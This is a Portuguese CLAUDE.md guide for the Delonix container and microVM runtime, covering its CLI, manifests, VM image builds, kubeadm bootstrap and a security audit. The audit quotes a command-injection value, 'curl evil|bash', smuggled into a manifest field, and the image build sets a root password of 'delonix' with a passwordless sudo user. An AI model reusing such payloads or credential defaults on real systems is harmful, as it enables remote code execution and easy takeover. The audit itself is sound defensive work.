# Delonix Runtime — guia do projeto (CLAUDE.md)

Motor de **containers e microVMs daemonless, rootless-first, kernel-native, em Rust**.
Repositório **público** (`angolardevops/delonix-runtime`, Apache-2.0) — extraído do monorepo
privado `delonix-paas` (ver [README.md](README.md) para a arquitectura dos 8 crates).

## Comandos

```bash
cargo build --workspace               # tudo
cargo test  --workspace               # testes
cargo build -p delonix-runtime-bin    # a CLI `delonix` (ver secção "CLI" abaixo)
```

## CLI (`delonix`)

O binário `delonix` (crate `delonix-runtime-bin`) é a CLI opensource completa deste motor —
homóloga ao Docker, distinta do `delonix`/`delonixctl` privados do `delonix-paas` (outro
repo/branch/remote, não afectados por nada aqui). Comandos agrupados semanticamente em vez de
uma lista plana, um módulo por grupo em `crates/delonix-runtime-bin/src/cmd/`:

- `delonix container` — run/ps/stop/rm/exec/logs. `run` aceita `-v/--volume` (nomeado ou bind
  mount, via `delonix-volume::VolumeStore::resolve_spec`, testado e funcional) e
  `--net host|none|<rede>`. `host`/`none` — comportamento original, inalterado, testado. `--net
  <rede-custom>` (`delonix-net::infra::attach_container` cria a netns NOMEADA do lado do holder,
  `RunSpec.join_netns` faz o container juntar-se a ela via `setns`) **está com uma limitação
  conhecida em rootless**: o `setns` falha com "netns do pod indisponível" — a netns fica dentro
  do userns mapeado do HOLDER (`unshare --user --map-root-user`, ver `infra::start_holder`), e o
  processo do container, sem privilégio nesse userns, não a consegue abrir. A doc do próprio
  `delonix-net` já aponta o mecanismo certo ("re-exec via `nsenter … ip netns exec`", ver
  `RunSpec.inherit_userns`), mas **não há hoje nenhum caminho no `delonix-runtime`/
  `delonix-runtime-bin` que faça esse re-exec para um container `run` normal** — só existe para
  o holder se auto-relançar. Fechar isto é trabalho de motor (crate `delonix-runtime`), não de
  CLI — ficou fora desta reestruturação; documentado aqui para não se repetir a investigação.
- `delonix image` — pull/ls/rm/export (bundle OCI para `runc`/`crun`).
- `delonix build -t <tag> [-f Dockerfile|Delonixfile] [contexto]` — único grupo com orquestração
  nova (as outras têm API pronta nas crates, isto é "ligar os fios"): sobe um container de
  trabalho (`sleep infinity`), corre cada `RUN` via `exec`, aplica `COPY` no rootfs em disco, e
  empacota com `ImageStore::commit_flat_rootfs` (rootless) ou `commit_upper`+`build_image` (root).
  **Só single-stage** — um Dockerfile com `FROM ... AS <nome>` seguido doutro `FROM` é recusado
  com erro claro; multi-stage fica para uma iteração seguinte (precisa de desenhar a passagem de
  rootfs entre estágios). **`Delonixfile`**: sem `-f`, `default_build_file` (`cmd/build.rs`)
  procura `<contexto>/Delonixfile` antes de `Dockerfile` — mesma gramática (`parse_dockerfile`
  já suporta as extensões Delonix `SCAN`/`CPUS`/`MEMORY`/`SECURITY`/`HEALTHCHECK`
  independentemente do nome do ficheiro); `Delonixfile` é só o nome canónico por omissão.
- `delonix vm` — create/ls/stop/rm/status, flags 1:1 com `delonix_vm::VmConfig`.
- `delonix volumes` — create/ls/rm/inspect, wrapper fino sobre `VolumeStore`.
- `delonix network` — ls/create/rm/inspect. **Dois stores em paralelo, deliberado**:
  `NetworkStore` (registo declarativo rico — drivers bridge/macvlan/ipvlan/overlay) e
  `infra::{network_create_with,network_remove}` (plano físico do holder netns rootless). Para o
  driver `bridge` (o único que os containers atacham hoje), `network create` orquestra os dois
  em conjunto; `macvlan`/`ipvlan`/`overlay` só ficam no `NetworkStore` (limitação conhecida).
- `delonix stack apply [-f delonix-manifest.yaml]` — ver secção "Manifesto/apply" abaixo.

## Manifesto/apply (`delonix-manifest.yaml`)

Manifesto declarativo multi-documento, ao estilo Kubernetes (`apiVersion: delonix.io/v1` /
`kind` / `metadata.name` / `spec`), para os 5 Kinds com grupo de CLI: `Network`/`Volume`/
`Image`/`Vm`/`Container`. Parsing central em `cmd/manifest.rs` (`serde_yaml`, só neste binário —
não entra em nenhum crate de mecanismo). Cada grupo (`cmd/{network,volume,image,vm,
container}.rs`) tem um `spec` tipado próprio (`NetworkSpec`, `VolumeSpec`, ...) e uma função
`pub fn apply(docs: &[ManifestDoc])` que filtra o seu Kind e aplica.

- **`delonix <container|image|vm|volumes|network> apply [-f ficheiro]`** — aplica só os
  documentos do Kind desse grupo (ignora os outros). Sem `-f`, usa `./delonix-manifest.yaml`
  (erro claro se não existir).
- **`delonix stack apply [-f ficheiro]`** — aplica TODOS os Kinds, por esta ordem (dependência
  por nome): Network → Volume → Image → Vm → Container. **Fail-fast, sem transacionalidade**: o
  que já foi aplicado antes de um erro FICA aplicado (sem rollback).
- **Semântica de `apply`: "garante presente", não um reconciliador.** Sem diffing/rollout/
  drift-detection contínua — isso é trabalho de um orchestrator com controllers (deliberadamente
  fora de escopo aqui; o equivalente privado, `delonix-orchestrator`, fica só no `delonix-paas`).
  Idempotência por Kind: `Network`/`Container` verificam existência por nome antes de criar
  (`store.get`/procura no `Store` por `c.name`); `Volume`/`Vm` já são idempotentes na própria API
  do crate (`VolumeStore::create*`, `delonix_vm::create`); `Image` com `spec.pull` é idempotente
  (`resolve_or_pull`), com `spec.build` reconstrói e substitui a tag a cada `apply` (não há cache
  de build). `kind: Container`'s `spec.detach` tem **default `true`** (diferente do CLI `run`,
  onde é `false`) — um `apply` em primeiro plano bloquearia à espera do processo terminar.
- Exemplo completo de manifesto e o mapeamento spec↔CLI: ver o doc-comment de
  `crates/delonix-runtime-bin/src/cmd/manifest.rs` e o plano desta sessão
  (`/home/walter/.claude/plans/mellow-cuddling-canyon.md`, mantido para referência histórica).

## Imagem VM dourada (`delonix image --vm`)

`delonix image --vm ls|pull|push|build` gere imagens VM à parte das imagens de container
(`ImageStore`) — um `.qcow2` solto + `.json` de metadados por imagem, em `<root>/vm-images/`
(`crates/delonix-runtime-bin/src/cmd/vmimage.rs`, `VmImageStore`). Prepara o terreno para
`delonix cluster kubeadm` (abaixo, ainda não implementado): a imagem já vem com `kubeadm`/
`kubelet`/`kubectl` e o `delonix-cri` a correr como serviço systemd — **arrancar um nó não faz
nenhuma instalação**, só `kubeadm init`/`kubeadm join` (quando esse comando existir).

- **`build`**: descarrega a cloud image Ubuntu (`cloud-images.ubuntu.com/releases/<release>/
  release/`, cache em `<root>/vm-images/_base/`, valida contra `SHA256SUMS` — nunca aceita um
  download sem verificar), achata-a (`qemu-img convert`, sem depender de um backing-file local
  no artefacto final), e corre `virt-customize` com uma lista de passos construída em Rust por
  `k8s_customization_steps()` — **isto é o "100% parametrizado"**: `--extra-package`/
  `--extra-run` estendem sem tocar no código. Instala o repositório `pkgs.k8s.io` +
  `kubeadm`/`kubelet`/`kubectl`, desliga swap, carrega `overlay`/`br_netfilter` + sysctls
  exigidos pelo kubelet/CNI, injecta o binário `delonix-cri` (ver abaixo) + a unit systemd
  (`dist/delonix-cri.service`, `systemctl enable`), e cria a conta padrão pedida: `root`/senha
  `delonix`, utilizador `delonix:delonix` em `sudo` com `NOPASSWD`. cloud-init fica ACTIVO na
  imagem (o build só corre uma vez; o cloud-init do primeiro-boot de CADA VM continua a aplicar
  hostname/SSH-keys — ver `delonix vm create` abaixo).
- **`push`/`pull`**: publicam/obtêm a imagem como artefacto OCI de blob único (config vazio + 1
  layer, padrão ORAS/Helm) via `delonix_image::registry::{push_oci_artifact,pull_oci_artifact}`
  (`crates/delonix-image/src/registry.rs`) — generaliza o `Client`/auth/upload já usado por
  `push_to_registry` (imagens de container), sem duplicar a lógica. **Bloqueio conhecido**:
  publicar de verdade em `ghcr.io/angolardevops/...` exige `docker login ghcr.io` (ou um token
  `gh` com scope `write:packages` — o actual só tem `repo`/`workflow`) — nunca executado nesta
  sessão, o código está pronto mas por autenticar.
- **Bloqueio de execução conhecido (sandbox, não bug)**: `virt-customize` falha aqui na fase de
  construção do appliance `supermin` — `/usr/lib/guestfs` (caminho genérico) não existe, só
  `/usr/lib/x86_64-linux-gnu/guestfs` (falta o pacote `libguestfs-common`, que normalmente liga
  os dois). Confirmado com `supermin --build` manual apontado ao caminho certo (funciona) — o
  `LIBGUESTFS_PATH` não resolve isto para o `virt-customize` em si (usa outro mecanismo interno
  de cache de appliance). Corrigir exigiria instalar um pacote no host — não fiz isso
  unilateralmente. O resto do pipeline (download+SHA256SUMS, `qemu-img convert`, geração da
  lista de passos) foi validado real até este ponto.

`delonix vm create` ganhou `--hostname`/`--ssh-key <chave-ou-@ficheiro>`/`--user-data <ficheiro>`
— sem `--seed` explícito, gera um ISO NoCloud (`cloud-localds`) por-instância se qualquer um
destes for dado (função pura `build_user_data`, testável sem `cloud-localds` real). Não confundir
com o `build` acima: aquele corre uma vez por IMAGEM (golden), isto corre uma vez por VM.

`delonix-cri` (`crates/delonix-cri`) ganhou o seu primeiro `[[bin]]` (`src/bin/delonix-cri.rs`)
— antes só existia como library, chamado por ninguém no workspace. Corre `serve_blocking` num
socket unix (`$DELONIX_CRI_ADDR`, default `/run/delonix-cri.sock`) — é o endpoint que o kubelet
fala via `--container-runtime-endpoint`, substituindo containerd/CRI-O.

## Cluster kubeadm (`delonix cluster apply`)

`delonix cluster apply [-f cloud.yaml]` (`kind: Cluster`) — bootstrap `kubeadm` idempotente sobre
SSH em hosts JÁ VIVOS e alcançáveis (não cria VMs — isso é `delonix vm create`, acima). Módulos:
`cmd/remote.rs` (shell-out a `ssh`/`scp` do sistema, `sudo -n` para os comandos remotos — o
utilizador SSH tem de já ter sudo NOPASSWD), `cmd/k8s_recipes.rs` (catálogo PARTILHADO com
`vmimage::build` — repositório `pkgs.k8s.io`/pacotes/swap/módulos/sysctls — para a imagem
dourada e um host preparado por `cluster apply` ficarem exactamente iguais), `cmd/cluster.rs`
(orquestração: prepara todos os hosts → `kubeadm init` no 1.º control-plane → `kubeadm join` dos
restantes control-planes → `kubeadm join` dos workers → traz o kubeconfig para
`<root>/clusters/<nome>-kubeconfig.yaml`, e copia para `~/.kube/config` se ainda não existir).

**Idempotência sem-estado** (pedido explícito, "parecido ao Terraform mas sem ficheiro de
estado"): cada passo de `k8s_recipes` tem um `check` (comando shell, êxito = já satisfeito) e um
`apply`; `kubeadm init`/`join` verificam `/etc/kubernetes/admin.conf`/`kubelet.conf` no host antes
de agir. Nunca dessincroniza de um `.tfstate` porque não há nenhum.

**Simplificações da v1** (pedido era "hosts arbitrários", escopo já grande sem estas):
- **Só etcd `stacked`** (default do kubeadm, co-localizado nos control-planes) — `etcd: external`
  é reconhecido no schema mas recusado com erro claro. Etcd externo (TLS entre membros,
  discovery) é um subprojecto à parte.
- **Execução sequencial**, não paralela, entre hosts — paralelizar a preparação (independente por
  host) é um follow-up de performance, não de correcção.
- **HA multi-control-plane exige `spec.controlPlaneEndpoint` explícito** — kubeadm precisa de um
  endpoint estável (LB/VIP) à frente de vários control-planes; com 1 só, usa o IP dele.
- Sem teste end-to-end real nesta sessão — este sandbox não tem hosts SSH remotos. Validado até à
  fronteira real: parsing/validação do manifesto, resolução do `delonix-cri`, geração dos
  comandos `kubeadm init`/`join`, e a tentativa real de SSH falha correctamente e com clareza
  (`No route to host` num IP de teste) — não há mais nada para simular sem máquinas verdadeiras.

## Auditoria de segurança (skill `delonix-runtime-sec`)

Antes de estender `delonix cluster apply`, foi feita uma auditoria ofensiva dedicada (skill nova
`.claude/skills/delonix-runtime-sec/`, perfil de red-team especializado em runtimes de
containers/VMs) — 3 revisões adversariais em paralelo (injecção de comandos, escalada de
privilégio/fuga de namespace, memory safety + cadeia de fornecimento + path traversal).

**Veredicto da fronteira rootless→root**: sólida, nenhum CRÍTICO/ALTO. Socket de controlo do
holder valida `SO_PEERCRED` correctamente entre user namespaces; `join_netns` só recebe caminhos
gerados server-side (nunca input directo do CLI); mapeamento de uid não permite apontar para uid
0 real do host em nenhum dos 3 caminhos (root real/rootless single-uid/rootless com subuid).

**4 achados CRÍTICOS confirmados e CORRIGIDOS nesta mesma sessão** (todos em código novo desta
sessão, nunca tinham sido revistos adversarialmente):

1. **Injecção de comandos via manifesto `Cluster`** — `controlPlaneEndpoint`/`podSubnet`/
   `serviceSubnet`/`k8sVersion` entravam sem saneamento num `format!` que vira o CORPO de um
   `sudo -n bash -c` remoto (`cmd::cluster::kubeadm_init`/`kubeadm_join`). Um `cloud.yaml` com
   `controlPlaneEndpoint: "10.0.0.10; curl evil|bash; #"` era RCE como root no host de produção.
   **Corrigido**: `cmd::cluster::{valid_endpoint,valid_cidr,valid_version}` — whitelist estrita de
   caracteres, chamada em `validate()` antes de qualquer interpolação. `shell_quote` (`remote.rs`)
   só protege a fronteira ssh→bash-c local — nunca sanitiza o CONTEÚDO do comando; esta era a
   lição a reter (documentada nos comentários das funções `valid_*`).
2. **Mesmo vector via `k8sVersion` em `k8s_recipes::k8s_host_recipes`** (repositório apt,
   corrido em TODOS os hosts, incluindo antes do `kubeadm init`) — **corrigido** com a mesma
   validação, reaproveitada também em `vmimage::cmd_build` (`--k8s-version` tem o mesmo caminho).
3. **`pull_oci_artifact` não verificava o digest do blob recebido** contra o manifesto — um
   registo `ghcr.io` comprometido podia servir uma imagem VM dourada adulterada sem detecção.
   **Corrigido**: verificação `sha256(bytes) == digest_esperado` antes de devolver, mesmo padrão
   já usado por `pull_from_registry_with_creds` (que já estava correcto).
4. **Path traversal em `COPY` do `delonix build`** — `src`/`dst` de um Dockerfile/Delonixfile não
   eram confinados ao contexto/rootfs (`..` não neutralizado). **Corrigido**: `cmd::build::
   safe_join` (mesmo padrão de `safe_rel` em `delonix-image::overlay`), rejeita qualquer
   componente `..`/absoluto fora da base.

**2 achados BAIXOS, defesa em profundidade, também corrigidos**: `--` antes de `user@host` nos
argv de `ssh`/`scp` (`remote.rs`); `VmImageStore::base_cache_path` passou a usar `sanitize()`
como os outros métodos do store (`vmimage.rs`).

Todos os 4 CRÍTICOS têm teste automatizado a replicar o exploit e confirmar a rejeição (`cargo
test -p delonix-runtime-bin`/`-p delonix-image`) — ver `cmd::cluster::tests::
validate_recusa_endpoint_malicioso_no_manifesto_completo`,
`registry::tests::pull_oci_artifact_recusa_blob_adulterado`,
`cmd::build::tests::safe_join_recusa_dot_dot`.

## Próximas fases (pedidas, não implementadas — cada uma precisa da sua própria sessão de planeamento)

- **`delonix cluster --name <n> --control-plane <n> --workers <n>`** (sem `kubeadm`) — cluster k8s
  local via `kind` (shell-out à ferramenta já instalada no host). Escopo médio; há precedente de
  "modo dev" equivalente em `delonix cluster` no `delonix-cli` privado (`delonix-paas`).
- **`etcd: external`** em `delonix cluster apply` — cluster etcd dedicado (TLS entre membros,
  discovery) em vez do `stacked` já suportado.
- **Paralelizar a preparação de host** em `cluster apply` (hoje sequencial, deliberado nesta v1).
- **`delonixd`** (daemon opcional em userspace) + **dataplane de ingress/egress próprio** (evitar
  um veth por container — hoje `infra::do_attach` cria sempre 1 veth-par por container,
  confirmado) + **firewall dinâmico** para publish de portas + **eBPF** para observabilidade +
  **auto-dimensionamento** no pico. Nenhuma peça disto existe hoje (zero eBPF/autoscaling/daemon
  no repo, confirmado por grep). É uma mudança de filosofia (o produto é daemonless por desenho)
  e um dataplane novo de raiz — meses de trabalho de um crate dedicado, não uma sessão.

## Regra de ouro: fronteira com o PaaS

Este código **não pode depender de nada privado**. Antes de qualquer commit:

1. **Nunca** adicionar uma dependência a `delonix-core`, `delonix-api`, `delonix-orchestrator`,
   ou qualquer outro crate do monorepo `delonix-paas` — este repo tem de compilar sozinho,
   sem acesso a nada privado. `cargo tree -e normal` não deve mostrar nenhum crate `delonix-*`
   que não esteja listado no `Cargo.toml` raiz.
2. **Sem noção de tenant/licença/billing/Console.** Se uma mudança precisar de saber "quem é
   o cliente" ou "que plano tem", essa lógica pertence ao `delonix-paas`, não aqui.
3. **`Secret`/`SecretStore`/`CredVault`** (`delonix-runtime-core::secret`/`cred_vault`) são o
   Secret Manager do runtime (`--secret`/`--secret-files`, Docker-style) — não confundir com
   nenhum cofre de credenciais de plataforma/SSO/DNS que o PaaS privado tenha por cima.
4. **`delonix-net` inclui WireGuard** (`wg.rs`) — cifra o transporte VXLAN entre nós, é SDN
   genuína (fica aqui). O broker de control-plane que decide QUANDO publicar portas
   (`Router`, multi-tenant) ficou no lado privado (`delonix-overlay`, em `delonix-paas`).

## Arquitetura (8 crates)

| Crate | Responsabilidade |
|---|---|
| `delonix-runtime-core` | tipos partilhados: `Container`, `Vm`, `Status` (6 estados), `Store`/`JsonStore`, typestate, deteção de virtualização, Secret Manager |
| `delonix-runtime` / `delonix-runtime-bin` | runtime de containers (clone/namespaces/cgroups, create/stop/exec, reconcile_status) + a CLI `delonix` completa (container/image/build/vm/volumes/network — ver secção "CLI" acima) |
| `delonix-net` | SDN rootless: holder netns + bridge + slirp único, DNAT/firewall nft, compat CNI, overlay WireGuard inter-nó |
| `delonix-image` | imagens OCI: pull/registry/build, buildpacks CNB, registo interno, verificação de assinatura |
| `delonix-vm` | microVMs declarativas — trait `VmBackend` (Cloud Hypervisor ou libvirt) |
| `delonix-volume` | volumes nomeados e bind mounts |
| `delonix-cri` | servidor CRI (`runtime.v1`) — permite ao Delonix servir de runtime a um `kubelet` |

## Histórico

Extraído de `delonix-paas` via `git filter-repo` (histórico real preservado, não squash) —
ver a skill `delonix-paas` no control dir para o produto de origem.
